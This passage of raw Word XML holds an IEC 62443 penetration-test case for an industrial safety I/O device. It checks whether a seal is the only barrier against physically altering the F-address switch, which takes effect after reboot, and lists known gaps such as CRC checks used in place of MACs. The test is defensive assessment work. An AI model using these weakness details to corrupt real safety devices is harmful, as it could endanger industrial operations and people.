          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ002-05 — Physical Tamper-Resistance of the F-Address Interface (G-3 proof — corrected scope)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B167B29" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16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7758"/>
      </w:tblGrid>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="02171D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7FB766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ABA64A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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="2C75A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EEA6E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44FC9" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>TC-RQ002-05</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="469DA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70BD4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D9157" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>RQ-002 → EDR 3.11 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>resistance</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>limb</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>) → Asset G</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="3338C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61916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D1705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Tampering</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>physical</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>, intentional)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00CB35D8" w14:paraId="049AE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84761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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A1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708D7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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (Penetration Testing — physical, PA-4)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00CB35D8" w14:paraId="2268D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4EAEB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50D37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 xml:space="preserve">Assess the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>protection</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the device provides against physical corruption of the F-address/mode switch: (a) confirm the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>temporal protection</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (a runtime switch change is ignored until reboot, so the running safety address cannot be corrupted live), and (b) determine whether the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>stored/next-boot address can be corrupted</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> by physically altering the switch, with the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>seal being the only resisting barrier</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>This test evaluates tamper-</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>resistance</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> only; whether the intervention is </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>recorded</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> is assessed separately under RQ-003.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00CB35D8" w14:paraId="0A806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86905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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16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1BB70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 xml:space="preserve">1. Record baseline address and seal state. 2. With the device in OPERATE, remove the seal/sleeve and change the rotary switch; verify (per SRIO-10812) the running address is </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>unchanged</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (temporal protection holds). 3. Cold-restart; confirm the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>new</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> address now takes effect (next-boot corruption succeeded). 4. Assess the seal's resistance (did alteration require visible seal damage?).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00CB35D8" w14:paraId="02726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97D7A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FBC29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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Gap-characterisation test.</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">) runtime change </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ignored</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (temporal protection = a genuine partial mitigation to credit); (ii) after reboot the altered address applies → the stored address </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>is</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> physically </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">corruptible; (iii) the only resistance is the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>passive seal</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, with </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no active tamper-detection/response</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> by the device → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-3</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (resistance-only physical protection), recorded as a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>partial</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> EDR 3.11 result.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79027980" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16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690A16" w:rsidRPr="00690A16" w14:paraId="2F3152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FC29C5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DB6EAA" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="2483C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A34BD" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16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5EDE1" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>TC-RQ002-05</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00CB35D8" w14:paraId="2DA69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2E7E3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6D06D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Physical access to DUT 192.168.0.2; management path Pi eth1 = 192.168.50.10 → IoT-Core (to read the applied address); browser 192.168.50.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00CB35D8" w14:paraId="3FD59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03C78" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16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CB12C" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Manual (seal removal, switch actuation); camera (seal state); curl to read /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>safecom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>f_address</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7FE4FCEF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# TC-RQ002-05 Physical tamper-resistance of the F-address switch (resistance only)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC84F3E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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId41" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/safecom/f_address</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC05_addr_before.json # baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3594BF16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# --- OPERATE: remove seal, change rotary switch; verify running address UNCHANGED ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2673865C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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/safecom/f_address</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC05_addr_runtime.json # expect: == before (SRIO-10812)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F64952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# --- COLD RESTART ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6796B8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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId43" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/safecom/f_address</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC05_addr_afterboot.json # expect: == new switch value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300DF912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diff TC05_addr_before.json TC05_addr_runtime.json | tee TC05_runtime_diff.txt # expect: no change</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2318F46B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>diff TC05_addr_runtime.json TC05_addr_afterboot.json | tee TC05_boot_diff.txt # expect: changed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F656E49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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Runtime change ignored (temporal protection, SRIO-8803/10812); new address applies after reboot; only the passive seal resisted the physical alteration; no active tamper-detection. | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Runtime change ignored (partial mitigation) ☐ Next-boot address corruptible ☐ Resistance = seal only (G-3 confirmed) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Seal before/after photos, TC05_addr_* reads, TC05_runtime_diff.txt, TC05_boot_diff.txt | </w:t>
      </w:r>
      <w:hyperlink r:id="rId44" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4144AFF3" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00000000" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="2EA6F5A7">
          <v:rect id="_x0000_i1038" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="031ED76C" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-002)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513AEB0D" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Removed the evidence-collection scope creep</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — dropped </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 2.8 / CR 6.1</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Asset I (Audit Data)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Repudiation</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> threat from RQ-002. These belong to </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-003</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (where we correctly handled them). </w:t>
      </w:r>
      <w:hyperlink r:id="rId45" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[IEC62443_4_2_source | Txt]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5C5840FE" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Re-scoped EDR 3.11</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to its </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tamper-resistance</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> limb only (physical barrier that resists/reveals corruption), not the audit-record limb.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C23700" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected TC-RQ002-05</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — it now tests physical </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tamper-resistance</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (temporal protection + seal-only barrier), and the*"is the intervention logged?"* check is explicitly deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-003 / TC-RQ003-03</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C4D5F6" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Retained the substantive protection gaps</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-1 transmitted-frame CRC≠MAC; G-2 stored-parameter CRC≠MAC incl. 16-bit </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; G-3 resistance-only physical protection) and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>temporal-protection mitigation</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (switch read only at </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). </w:t>
      </w:r>
